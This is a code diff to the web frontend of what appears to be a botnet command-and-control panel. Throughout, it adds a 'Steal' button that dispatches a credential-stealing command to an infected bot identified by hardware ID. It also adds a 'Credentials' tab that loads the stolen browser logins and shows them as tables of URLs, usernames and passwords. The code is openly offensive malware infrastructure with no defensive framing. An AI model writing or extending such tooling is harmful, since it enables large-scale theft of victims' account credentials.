@@ -358,10 +358,40 @@ function renderBotDetail(bot, commands) {
   ]);
   panel.appendChild(form);
 
-  // Command history
-  const historyDiv = el('div', { className: 'command-history' }, [
-    el('h4', {}, ['Recent Commands'])
+  // Steal button
+  panel.appendChild(el('div', { className: 'action-buttons' }, [
+    el('button', {
+      className: 'btn btn-danger btn-sm',
+      onclick: () => dispatchSteal(bot.hwid),
+    }, ['Steal']),
+  ]));
+
+  // Tabs
+  const tabBar = el('div', { className: 'tab-bar' }, [
+    el('button', {
+      className: 'tab-btn',
+      dataset: { tab: 'history' },
+      onclick: (e) => switchTab(e, 'history', bot.hwid),
+    }, ['History']),
+    el('button', {
+      className: 'tab-btn',
+      dataset: { tab: 'credentials' },
+      onclick: (e) => switchTab(e, 'credentials', bot.hwid),
+    }, ['Credentials']),
   ]);
+  panel.appendChild(tabBar);
+
+  const tabHistory = el('div', { id: 'tab-history', className: 'tab-panel' }, []);
+  const tabCredentials = el('div', { id: 'tab-credentials', className: 'tab-panel hidden' }, []);
+  panel.appendChild(tabHistory);
+  panel.appendChild(tabCredentials);
+
+  // Activate history tab by default
+  tabBar.querySelector('[data-tab="history"]').classList.add('active');
+
+  // Command history (inside history tab)
+  const historyDiv = tabHistory;
+  historyDiv.appendChild(el('h4', {}, ['Recent Commands']));
 
   if (commands.length === 0) {
     historyDiv.appendChild(el('p', { className: 'empty-state' }, ['No commands yet']));
@@ -388,7 +418,6 @@ function renderBotDetail(bot, commands) {
     table.appendChild(tbody);
     historyDiv.appendChild(table);
   }
-  panel.appendChild(historyDiv);
 }
 
 function createCommandSelect() {
@@ -432,6 +461,69 @@ function closeDetail() {
   document.getElementById('bot-detail').hidden = true;
   state.selectedBot = null;
   renderBotGrid(state.bots);
+}
+
+function switchTab(e, tabName, hwid) {
+  const panel = document.getElementById('bot-detail');
+  panel.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+  panel.querySelectorAll('.tab-panel').forEach(p => p.classList.add('hidden'));
+
+  e.currentTarget.classList.add('active');
+  const target = document.getElementById(`tab-${tabName}`);
+  if (target) target.classList.remove('hidden');
+
+  if (tabName === 'credentials') loadCredentials(hwid);
+}
+
+async function dispatchSteal(hwid) {
+  try {
+    const result = await api.post(`/api/bots/${hwid}/steal`, {
+      staging_base_url: window.location.origin,
+      timeout_secs: 60,
+    });
+    showToast(
+      result.queued
+        ? 'Steal queued (bot offline)'
+        : `Steal dispatched (${result.command_id.slice(0, 8)})`,
+      result.queued ? 'info' : 'success',
+    );
+  } catch (err) {
+    showToast('Steal failed: ' + err.message, 'error');
+  }
+}
+
+async function loadCredentials(hwid) {
+  const panel = document.getElementById('tab-credentials');
+  if (!panel) return;
+  panel.textContent = '';
+  try {
+    const data = await api.get(`/api/bots/${hwid}/stealer-results`);
+    if (data.total === 0) {
+      panel.appendChild(el('p', { className: 'empty-state' }, ['No credentials collected yet.']));
+      return;
+    }
+    for (const result of data.results) {
+      if (!result.credentials.length) continue;
+      panel.appendChild(el('table', { className: 'data-table' }, [
+        el('thead', {}, [el('tr', {}, [
+          el('th', {}, ['Browser']),
+          el('th', {}, ['URL']),
+          el('th', {}, ['Username']),
+          el('th', {}, ['Password']),
+        ])]),
+        el('tbody', {}, result.credentials.map(c =>
+          el('tr', {}, [
+            el('td', {}, [c.browser || '?']),
+            el('td', {}, [c.url || '']),
+            el('td', {}, [c.username || '']),
+            el('td', { className: 'password-cell' }, [c.password || '']),
+          ])
+        )),
+      ]));
+    }
+  } catch (err) {
+    panel.appendChild(el('p', { className: 'error' }, ['Failed to load: ' + err.message]));
+  }
 }
 
 // ============================================================================
